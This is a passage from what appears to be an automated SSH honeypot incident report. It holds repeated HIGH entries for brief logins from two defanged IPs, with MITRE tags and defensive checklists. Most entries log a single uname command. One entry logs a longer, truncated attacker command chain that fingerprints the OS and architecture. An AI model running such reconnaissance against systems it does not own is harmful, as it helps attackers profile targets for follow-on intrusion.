**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:51:18` | `cowrie.session.connect` |
| `2026-07-12 14:51:18` | `cowrie.client.version` |
| `2026-07-12 14:51:18` | `cowrie.client.kex` |
| `2026-07-12 14:51:18` | `cowrie.login.success` |
| `2026-07-12 14:51:19` | `cowrie.session.params` |
| `2026-07-12 14:51:19` | `cowrie.command.input` |
| `2026-07-12 14:51:19` | `cowrie.log.closed` |
| `2026-07-12 14:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1a84d1c7681

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:51 |
| **Last Seen** | 2026-07-12 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:51:23` | `cowrie.session.connect` |
| `2026-07-12 14:51:23` | `cowrie.client.version` |
| `2026-07-12 14:51:24` | `cowrie.client.kex` |
| `2026-07-12 14:51:24` | `cowrie.login.success` |
| `2026-07-12 14:51:25` | `cowrie.session.params` |
| `2026-07-12 14:51:25` | `cowrie.command.input` |
| `2026-07-12 14:51:25` | `cowrie.log.closed` |
| `2026-07-12 14:51:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ad19ee8cc7b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:51 |
| **Last Seen** | 2026-07-12 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:51:30` | `cowrie.session.connect` |
| `2026-07-12 14:51:30` | `cowrie.client.version` |
| `2026-07-12 14:51:30` | `cowrie.client.kex` |
| `2026-07-12 14:51:30` | `cowrie.login.success` |
| `2026-07-12 14:51:31` | `cowrie.session.params` |
| `2026-07-12 14:51:31` | `cowrie.command.input` |
| `2026-07-12 14:51:32` | `cowrie.log.closed` |
| `2026-07-12 14:51:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d35b86f8009

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-12 14:51 |
| **Last Seen** | 2026-07-12 14:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:51:33` | `cowrie.session.connect` |
| `2026-07-12 14:51:33` | `cowrie.client.version` |
| `2026-07-12 14:51:33` | `cowrie.client.kex` |
| `2026-07-12 14:51:34` | `cowrie.login.success` |
| `2026-07-12 14:51:35` | `cowrie.session.params` |
| `2026-07-12 14:51:35` | `cowrie.command.input` |
| `2026-07-12 14:51:35` | `cowrie.command.input` |
| `2026-07-12 14:51:35` | `cowrie.command.input` |
| `2026-07-12 14:51:35` | `cowrie.command.input` |
| `2026-07-12 14:51:35` | `cowrie.command.input` |
| `2026-07-12 14:51:35` | `cowrie.command.success` |
| `2026-07-12 14:51:35` | `cowrie.command.input` |
| `2026-07-12 14:51:35` | `cowrie.command.input` |
| `2026-07-12 14:51:35` | `cowrie.command.input` |
| `2026-07-12 14:51:35` | `cowrie.command.input` |
| `2026-07-12 14:51:35` | `cowrie.log.closed` |
| `2026-07-12 14:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c6da30b3e18

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:51 |
| **Last Seen** | 2026-07-12 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:51:35` | `cowrie.session.connect` |
| `2026-07-12 14:51:35` | `cowrie.client.version` |
| `2026-07-12 14:51:35` | `cowrie.client.kex` |
| `2026-07-12 14:51:36` | `cowrie.login.success` |
| `2026-07-12 14:51:37` | `cowrie.session.params` |
| `2026-07-12 14:51:37` | `cowrie.command.input` |
| `2026-07-12 14:51:37` | `cowrie.log.closed` |
| `2026-07-12 14:51:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a37232f36437

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:51 |
| **Last Seen** | 2026-07-12 14:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:51:41` | `cowrie.session.connect` |
| `2026-07-12 14:51:41` | `cowrie.client.version` |
| `2026-07-12 14:51:41` | `cowrie.client.kex` |
| `2026-07-12 14:51:42` | `cowrie.login.success` |
| `2026-07-12 14:51:43` | `cowrie.session.params` |
| `2026-07-12 14:51:43` | `cowrie.command.input` |
| `2026-07-12 14:51:43` | `cowrie.log.closed` |
| `2026-07-12 14:51:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f810082b7f4c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:51 |
| **Last Seen** | 2026-07-12 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:51:46` | `cowrie.session.connect` |
| `2026-07-12 14:51:46` | `cowrie.client.version` |
| `2026-07-12 14:51:46` | `cowrie.client.kex` |
| `2026-07-12 14:51:47` | `cowrie.login.success` |
| `2026-07-12 14:51:48` | `cowrie.session.params` |
| `2026-07-12 14:51:48` | `cowrie.command.input` |
| `2026-07-12 14:51:48` | `cowrie.log.closed` |
| `2026-07-12 14:51:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-322c4fe6130a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:51 |
| **Last Seen** | 2026-07-12 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:51:53` | `cowrie.session.connect` |
| `2026-07-12 14:51:53` | `cowrie.client.version` |
| `2026-07-12 14:51:53` | `cowrie.client.kex` |
| `2026-07-12 14:51:53` | `cowrie.login.success` |
| `2026-07-12 14:51:54` | `cowrie.session.params` |
| `2026-07-12 14:51:54` | `cowrie.command.input` |
| `2026-07-12 14:51:54` | `cowrie.log.closed` |
| `2026-07-12 14:51:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03dfce5d65e2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:51 |
| **Last Seen** | 2026-07-12 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:51:57` | `cowrie.session.connect` |
| `2026-07-12 14:51:58` | `cowrie.client.version` |
| `2026-07-12 14:51:58` | `cowrie.client.kex` |
| `2026-07-12 14:51:58` | `cowrie.login.success` |
| `2026-07-12 14:51:59` | `cowrie.session.params` |
| `2026-07-12 14:51:59` | `cowrie.command.input` |
| `2026-07-12 14:51:59` | `cowrie.log.closed` |
| `2026-07-12 14:51:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7404d6b4c284

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:52 |
| **Last Seen** | 2026-07-12 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:52:03` | `cowrie.session.connect` |
| `2026-07-12 14:52:03` | `cowrie.client.version` |
| `2026-07-12 14:52:03` | `cowrie.client.kex` |
| `2026-07-12 14:52:04` | `cowrie.login.success` |
| `2026-07-12 14:52:05` | `cowrie.session.params` |
| `2026-07-12 14:52:05` | `cowrie.command.input` |
| `2026-07-12 14:52:05` | `cowrie.log.closed` |
| `2026-07-12 14:52:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89dc425419de

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:52 |
| **Last Seen** | 2026-07-12 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:52:09` | `cowrie.session.connect` |
| `2026-07-12 14:52:09` | `cowrie.client.version` |
| `2026-07-12 14:52:09` | `cowrie.client.kex` |
| `2026-07-12 14:52:09` | `cowrie.login.success` |
| `2026-07-12 14:52:10` | `cowrie.session.params` |
| `2026-07-12 14:52:10` | `cowrie.command.input` |
| `2026-07-12 14:52:11` | `cowrie.log.closed` |
| `2026-07-12 14:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58bdcb0a0308

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:52 |
| **Last Seen** | 2026-07-12 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:52:15` | `cowrie.session.connect` |
| `2026-07-12 14:52:15` | `cowrie.client.version` |
| `2026-07-12 14:52:15` | `cowrie.client.kex` |
| `2026-07-12 14:52:16` | `cowrie.login.success` |
| `2026-07-12 14:52:16` | `cowrie.session.params` |
| `2026-07-12 14:52:16` | `cowrie.command.input` |
| `2026-07-12 14:52:17` | `cowrie.log.closed` |
| `2026-07-12 14:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-732b2c039f3f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:52 |
| **Last Seen** | 2026-07-12 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:52:21` | `cowrie.session.connect` |
| `2026-07-12 14:52:21` | `cowrie.client.version` |
| `2026-07-12 14:52:21` | `cowrie.client.kex` |
| `2026-07-12 14:52:21` | `cowrie.login.success` |
| `2026-07-12 14:52:22` | `cowrie.session.params` |
| `2026-07-12 14:52:22` | `cowrie.command.input` |
| `2026-07-12 14:52:22` | `cowrie.log.closed` |
| `2026-07-12 14:52:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8dd3bca9a1d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:52 |
| **Last Seen** | 2026-07-12 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:52:26` | `cowrie.session.connect` |
| `2026-07-12 14:52:27` | `cowrie.client.version` |
| `2026-07-12 14:52:27` | `cowrie.client.kex` |
| `2026-07-12 14:52:27` | `cowrie.login.success` |
| `2026-07-12 14:52:28` | `cowrie.session.params` |
| `2026-07-12 14:52:28` | `cowrie.command.input` |
| `2026-07-12 14:52:28` | `cowrie.log.closed` |
| `2026-07-12 14:52:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd1cfff93e19

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:52 |
| **Last Seen** | 2026-07-12 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:52:32` | `cowrie.session.connect` |
| `2026-07-12 14:52:32` | `cowrie.client.version` |
| `2026-07-12 14:52:32` | `cowrie.client.kex` |
| `2026-07-12 14:52:33` | `cowrie.login.success` |
| `2026-07-12 14:52:34` | `cowrie.session.params` |
| `2026-07-12 14:52:34` | `cowrie.command.input` |
| `2026-07-12 14:52:34` | `cowrie.log.closed` |
| `2026-07-12 14:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-584cebcf7d6f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:52 |
| **Last Seen** | 2026-07-12 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:52:38` | `cowrie.session.connect` |
| `2026-07-12 14:52:39` | `cowrie.client.version` |
| `2026-07-12 14:52:39` | `cowrie.client.kex` |
| `2026-07-12 14:52:39` | `cowrie.login.success` |
| `2026-07-12 14:52:40` | `cowrie.session.params` |
| `2026-07-12 14:52:40` | `cowrie.command.input` |
| `2026-07-12 14:52:40` | `cowrie.log.closed` |
| `2026-07-12 14:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cff9827e5d8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:52 |
| **Last Seen** | 2026-07-12 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:52:44` | `cowrie.session.connect` |
| `2026-07-12 14:52:44` | `cowrie.client.version` |
| `2026-07-12 14:52:44` | `cowrie.client.kex` |
| `2026-07-12 14:52:44` | `cowrie.login.success` |
| `2026-07-12 14:52:45` | `cowrie.session.params` |
| `2026-07-12 14:52:45` | `cowrie.command.input` |
| `2026-07-12 14:52:45` | `cowrie.log.closed` |
| `2026-07-12 14:52:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63376678bc3e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:52 |
| **Last Seen** | 2026-07-12 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:52:50` | `cowrie.session.connect` |
| `2026-07-12 14:52:50` | `cowrie.client.version` |
| `2026-07-12 14:52:50` | `cowrie.client.kex` |
| `2026-07-12 14:52:51` | `cowrie.login.success` |
| `2026-07-12 14:52:51` | `cowrie.session.params` |
| `2026-07-12 14:52:51` | `cowrie.command.input` |
| `2026-07-12 14:52:52` | `cowrie.log.closed` |
| `2026-07-12 14:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7feef4a7ef54

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:52 |
| **Last Seen** | 2026-07-12 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:52:55` | `cowrie.session.connect` |
| `2026-07-12 14:52:56` | `cowrie.client.version` |
| `2026-07-12 14:52:56` | `cowrie.client.kex` |
| `2026-07-12 14:52:56` | `cowrie.login.success` |
| `2026-07-12 14:52:57` | `cowrie.session.params` |
| `2026-07-12 14:52:57` | `cowrie.command.input` |
| `2026-07-12 14:52:57` | `cowrie.log.closed` |
| `2026-07-12 14:52:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-699d8625b897

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:53 |
| **Last Seen** | 2026-07-12 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:53:01` | `cowrie.session.connect` |
| `2026-07-12 14:53:01` | `cowrie.client.version` |
| `2026-07-12 14:53:01` | `cowrie.client.kex` |
| `2026-07-12 14:53:02` | `cowrie.login.success` |
| `2026-07-12 14:53:03` | `cowrie.session.params` |
| `2026-07-12 14:53:03` | `cowrie.command.input` |
| `2026-07-12 14:53:03` | `cowrie.log.closed` |
| `2026-07-12 14:53:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aff0bc3f3741

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:53 |
| **Last Seen** | 2026-07-12 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:53:07` | `cowrie.session.connect` |
| `2026-07-12 14:53:07` | `cowrie.client.version` |
| `2026-07-12 14:53:07` | `cowrie.client.kex` |
| `2026-07-12 14:53:08` | `cowrie.login.success` |
| `2026-07-12 14:53:09` | `cowrie.session.params` |
| `2026-07-12 14:53:09` | `cowrie.command.input` |
| `2026-07-12 14:53:09` | `cowrie.log.closed` |
| `2026-07-12 14:53:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c1f67010a94

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:53 |
| **Last Seen** | 2026-07-12 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:53:13` | `cowrie.session.connect` |
| `2026-07-12 14:53:13` | `cowrie.client.version` |
| `2026-07-12 14:53:13` | `cowrie.client.kex` |
| `2026-07-12 14:53:14` | `cowrie.login.success` |
| `2026-07-12 14:53:15` | `cowrie.session.params` |
| `2026-07-12 14:53:15` | `cowrie.command.input` |
| `2026-07-12 14:53:15` | `cowrie.log.closed` |
| `2026-07-12 14:53:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fd18dd227ad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:53 |
| **Last Seen** | 2026-07-12 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:53:19` | `cowrie.session.connect` |
| `2026-07-12 14:53:19` | `cowrie.client.version` |
| `2026-07-12 14:53:19` | `cowrie.client.kex` |
| `2026-07-12 14:53:19` | `cowrie.login.success` |
| `2026-07-12 14:53:20` | `cowrie.session.params` |
| `2026-07-12 14:53:20` | `cowrie.command.input` |
| `2026-07-12 14:53:20` | `cowrie.log.closed` |
| `2026-07-12 14:53:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9115be1c50a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:53 |
| **Last Seen** | 2026-07-12 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:53:24` | `cowrie.session.connect` |
| `2026-07-12 14:53:24` | `cowrie.client.version` |
| `2026-07-12 14:53:24` | `cowrie.client.kex` |
| `2026-07-12 14:53:25` | `cowrie.login.success` |
| `2026-07-12 14:53:25` | `cowrie.session.params` |
| `2026-07-12 14:53:25` | `cowrie.command.input` |
| `2026-07-12 14:53:26` | `cowrie.log.closed` |
| `2026-07-12 14:53:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-452cebc05154

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:53 |
| **Last Seen** | 2026-07-12 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:53:29` | `cowrie.session.connect` |
| `2026-07-12 14:53:29` | `cowrie.client.version` |
| `2026-07-12 14:53:29` | `cowrie.client.kex` |
| `2026-07-12 14:53:30` | `cowrie.login.success` |
| `2026-07-12 14:53:31` | `cowrie.session.params` |
| `2026-07-12 14:53:31` | `cowrie.command.input` |
| `2026-07-12 14:53:31` | `cowrie.log.closed` |
| `2026-07-12 14:53:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
